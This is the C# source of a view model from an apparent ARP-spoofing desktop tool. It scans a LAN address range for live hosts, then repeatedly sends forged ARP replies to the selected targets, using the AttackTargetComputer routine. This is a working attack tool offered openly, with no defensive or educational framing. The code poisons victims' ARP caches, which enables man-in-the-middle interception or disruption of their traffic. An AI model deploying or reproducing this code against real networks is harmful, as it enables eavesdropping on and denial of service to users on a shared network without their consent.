using ArpSpoofing.Entity;
using ArpSpoofing.Util;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using CommunityToolkit.Mvvm.Messaging;
using CommunityToolkit.Mvvm.Messaging.Messages;
using Microsoft.UI.Dispatching;
using Microsoft.UI.Xaml.Controls;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;

namespace ArpSpoofing.ViewModels
{
    public partial class ArpViewModel : ObservableObject
    {
        private readonly DispatcherQueue dispatcherQueue = DispatcherQueue.GetForCurrentThread();

        private CancellationTokenSource _cancellationTokenSource; //取消scan的token

        private LibPcapLiveDevice libPcapLiveDevice;

        private PcapAddress localip;

        [ObservableProperty]
        private string startScanIp;

        [ObservableProperty]
        private string endScanIp;

        [ObservableProperty]
        private ObservableCollection<Computer> computers = new();

        [ObservableProperty]
        private ObservableCollection<ArpAttackComputer> arpAttackComputers = new();


        public ArpViewModel()
        {
            var response = WeakReferenceMessenger.Default.Send<RequestMessage<LibPcapLiveDevice>, string>("RequestScanIp");
            if (response.HasReceivedResponse && response.Response != null)
            {
                libPcapLiveDevice = response.Response;

                localip = libPcapLiveDevice.Addresses.FirstOrDefault(x => x.Addr.type == Sockaddr.AddressTypes.AF_INET_AF_INET6
                        && x.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);

                StartScanIp = localip.Addr.ipAddress.ToString();

                var endIpBytes = localip.Addr.ipAddress.GetAddressBytes();
                endIpBytes[^1] = 254;
                EndScanIp = new IPAddress(endIpBytes).ToString();
            }
            _cancellationTokenSource = new CancellationTokenSource();
        }

        [RelayCommand]
        private async Task ScanAsync()
        {
            if (!IPAddress.TryParse(StartScanIp, out var startIp) || !IPAddress.TryParse(EndScanIp, out var endIp))
            {
                ContentDialog dialog = new()
                {
                    Title = "错误",
                    Content = "请输入正确的IP地址",
                    XamlRoot = App.MainRoot.XamlRoot,
                    PrimaryButtonText = "OK",
                };

                await dialog.ShowAsync();
                return;
            }

            await ScanLanAsync(startIp, endIp);
        }

        [RelayCommand]
        private void AttackTargetComputer()
        {
            var targets = Computers.Where(x => x.IsSelect).ToList();
            if (!targets.Any())
            {
                ContentDialog dialog = new()
                {
                    Title = "错误",
                    Content = "没有合适的目标攻击主机",
                    XamlRoot = App.MainRoot.XamlRoot,
                    PrimaryButtonText = "OK",
                };

                dialog.ShowAsync().GetAwaiter().GetResult();
            }

            if (!libPcapLiveDevice.Opened)
            {
                libPcapLiveDevice.Open(DeviceModes.Promiscuous,20);
            }

            foreach (var target in targets)
            {
                var packet = NetProtocolWrapper.BuildArpResponse(IPAddress.Parse(target.IPAddress), PhysicalAddress.Parse(target.MacAddress), localip.Addr.ipAddress, libPcapLiveDevice.MacAddress);

                var attackComputer = new ArpAttackComputer()
                {
                    IPAddress = target.IPAddress,
                    MacAddress = target.MacAddress,
                };

                attackComputer.ArpAttackTask = Task.Run(async () =>
                {
                    while (true)
                    {
                        if (attackComputer.CancellationTokenSource.IsCancellationRequested)
                        {
                            break;
                        }

                        try
                        {
                            libPcapLiveDevice.SendPacket(packet);
                            if (!attackComputer.Succeed)
                            {
                                attackComputer.Succeed = true;
                            }
                        }
                        catch (Exception ex)
                        {
                            attackComputer.Succeed = false;
                        }

                        await Task.Delay(1000);
                    }
                },attackComputer.CancellationTokenSource.Token);

                ArpAttackComputers.Add(attackComputer);
            }
        }


        public async Task ScanLanAsync(IPAddress startIp, IPAddress endIp)
        {
            if (startIp == endIp)
            {
                return;
            }
            var startIpbytes = startIp.GetAddressBytes();
            var start = startIpbytes[^1];
            var end = endIp.GetAddressBytes()[^1];
            var targetIPList = new List<IPAddress>(end - start + 1);
            for (var i = start; i <= end; i++)
            {
                targetIPList.Add(new IPAddress(startIpbytes));
                startIpbytes[^1] += 1;

            }
            var arpPackets = new Packet[targetIPList.Count];

            for (int i = 0; i < arpPackets.Length; i++)
            {
                arpPackets[i] = NetProtocolWrapper.BuildArpRequest(targetIPList[i], localip.Addr.ipAddress, libPcapLiveDevice.MacAddress);
            }

            string arpFilter = "arp and ether dst " + libPcapLiveDevice.MacAddress.ToString();
            //open the device with 20ms timeout
            libPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
            libPcapLiveDevice.Filter = arpFilter;

            Computers.Clear();
            

            var task = Task.Run(() =>
            {
                Parallel.ForEach(arpPackets, (arpPack,state,i) =>
                {
                    if (_cancellationTokenSource.IsCancellationRequested)
                    {
                        state.Break();
                    }
                    var lastRequestTime = DateTimeOffset.MinValue;
                    var requestInterval = TimeSpan.FromMilliseconds(200);
                    var timeoutDateTime = DateTimeOffset.Now + new TimeSpan(0, 0, 3);

                    while (DateTimeOffset.Now < timeoutDateTime)
                    {
                        if (_cancellationTokenSource.IsCancellationRequested)
                        {
                            break;
                        }

                        if (requestInterval < (DateTimeOffset.Now - lastRequestTime))
                        {
                            libPcapLiveDevice.SendPacket(arpPack);
                            lastRequestTime = DateTimeOffset.Now;
                        }

                        if (libPcapLiveDevice.GetNextPacket(out var packet) > 0)
                        {
                            if (packet.Device.LinkType != LinkLayers.Ethernet)
                            {
                                continue;
                            }

                            var pack = Packet.ParsePacket(packet.Device.LinkType, packet.Data.ToArray());
                            var arpPacket = pack.Extract<ArpPacket>();

                            if (arpPacket == null)
                            {
                                continue;
                            }

                            //回复的arp包并且是我们请求的ip地址
                            if (arpPacket.SenderProtocolAddress.Equals(targetIPList[(int)i]))
                            {
                                dispatcherQueue.TryEnqueue(() =>
                                {
                                    Computers.Add(new Computer()
                                    {
                                        IPAddress = arpPacket.SenderProtocolAddress.ToString(),
                                        MacAddress = PhysicalToString(arpPacket.SenderHardwareAddress),
                                        Sort = arpPacket.SenderProtocolAddress.GetAddressBytes()[^1],
                                    });
                                });

                                break;
                            }
                        }
                    }
                });

                libPcapLiveDevice.Close();

                dispatcherQueue.TryEnqueue(async () =>
                {
                    ContentDialog dialog = new()
                    {
                        Title = "完成",
                        Content = "扫描完成",
                        XamlRoot = App.MainRoot.XamlRoot,
                        PrimaryButtonText = "OK",
                    };

                    await dialog.ShowAsync();
                    _cancellationTokenSource = new();
                });

            }, _cancellationTokenSource.Token);

            await task;
        }

        public string PhysicalToString(PhysicalAddress macAddress)
        {
            if (macAddress == null)
            {
                return null;
            }

            var bytes = macAddress.GetAddressBytes();

            var mac = $"{bytes[0]:X2}-{bytes[1]:X2}-{bytes[2]:X2}-{bytes[3]:X2}-{bytes[4]:X2}-{bytes[5]:X2}";

            return mac;
        }
    }
}